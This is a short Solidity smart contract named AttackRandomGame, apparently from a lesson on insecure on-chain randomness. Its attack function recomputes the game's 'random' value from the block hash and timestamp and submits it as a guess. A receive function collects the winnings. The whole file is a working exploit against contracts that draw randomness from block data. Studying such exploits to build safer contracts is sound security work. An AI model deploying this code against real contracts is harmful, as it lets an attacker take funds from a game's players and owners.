// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./RandomGame.sol";

contract AttackRandomGame {
    RandomGame randomGame;

    constructor(address gameAddress) {
        randomGame = RandomGame(gameAddress);
    }

    function attack() public {
        uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        randomGame.guess(_guess);
    }
    receive() external payable {}
}